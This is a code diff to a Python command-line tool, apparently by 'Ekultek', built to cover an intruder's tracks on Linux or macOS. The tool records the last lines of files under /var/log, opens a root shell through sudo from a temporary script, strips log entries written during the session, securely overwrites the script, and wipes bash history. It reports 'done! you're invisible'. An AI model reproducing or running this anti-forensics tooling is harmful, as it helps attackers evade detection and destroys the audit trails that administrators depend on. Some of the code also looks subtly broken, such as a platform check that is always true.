@@ -1,9 +1,9 @@
 import os
-import sys
 import time
+import string
+import random
 import argparse
 import platform
-
 
 __version__ = "0.1"
 __author__ = "Ekultek"
@@ -23,10 +23,54 @@ class Parser(argparse.ArgumentParser):
         return parser.parse_args()
 
 
+def safe_delete(path, passes=3):
+    import struct
+
+    length = os.path.getsize(path)
+    data = open(path, "w")
+    # fill with random printable characters
+    for _ in xrange(passes):
+        data.seek(0)
+        data.write(''.join(random.choice(string.printable) for _ in range(length)))
+    # fill with random data from the OS
+    for _ in xrange(passes):
+        data.seek(0)
+        data.write(os.urandom(length))
+    # fill with null bytes
+    for _ in xrange(passes):
+        data.seek(0)
+        data.write(struct.pack("B", 0) * length)
+    data.close()
+    os.remove(path)
+
+
+def open_next_terminal():
+    import subprocess
+
+    def rand(path="/tmp"):
+        acc = string.ascii_letters
+        retval = []
+        for _ in range(7):
+            retval.append(random.choice(acc))
+        return "{}/{}.sh".format(path, ''.join(retval))
+
+    file_path = rand()
+    with open(file_path, "a+") as data:
+        data.write(
+'''
+#!/bin/bash
+"$@"
+exec $SHELL
+'''
+        )
+    subprocess.call(["sudo", "bash", "{}".format(file_path)])
+    return file_path
+
+
 def needs_history_cleared():
     if "linux" or "darwin" in str(platform.platform()).lower():
         print("clearing bash history")
-        os.system("history -c && history -w")
+        os.system("cat /dev/null > ~/.bash_history && history -c && exit")
 
 
 def current_end_log(log_root_path):
@@ -34,6 +78,7 @@ def current_end_log(log_root_path):
     find the current last lines on the log files
     these will be used as reference later to scrub the logs
     """
+
     def tails(file_object, last_lines):
         """
         mimics the tail command
@@ -82,46 +127,27 @@ def main():
     """
     main function
     """
-    print("extracting pointers from logs")
+    seperator = "*" * 30
     opt = Parser().optparse()
     if opt.logPath is None:
-        print("no path provided defaulting to /var/log")
         path = "/var/log"
     else:
         path = opt.logPath
+    print("extracting last known log from: '{}'".format(path))
     current_time = time.time()
     current_last_lines = current_end_log(path)
-    i = 1
-    print(
-        "logs are being monitored, continue what you're doing and we'll wait, press "
-        "CNTRL-C when you're ready to clean the logs"
-    )
-    try:
-        while True:
-            sys.stdout.write(".")
-            sys.stdout.flush()
-            time.sleep(1)
-            i += 1
-    except KeyboardInterrupt:
-        print("\n")
-        print("fixing log files")
-        for item in current_last_lines:
-            edit_logs(item[0], item[1], current_time)
-        needs_history_cleared()
-    print("done! you're invisible, you where in for {} second(s)".format(i))
+    print("log files are being monitored, new root terminal has been launched, type `exit` to leave the terminal.")
+    print(seperator)
+    file_path = open_next_terminal()
+    print(seperator)
+    print("soaping up the log files")
+    for item in current_last_lines:
+        edit_logs(item[0], item[1], current_time)
+    print("washing off the soap")
+    safe_delete(file_path)
+    needs_history_cleared()
+    print("done! you're invisible")
 
 
 if __name__ == "__main__":
-    sep = "-" * 30
-    print(
-        "\n{}\nProgram: {}\nVersion: {}\nAuthor: {}\nTwitter: {}\n{}\n".format(
-            sep,
-            __progname__,
-            __version__,
-            __author__,
-            __twitter__,
-            sep
-        )
-    )
-
     main()
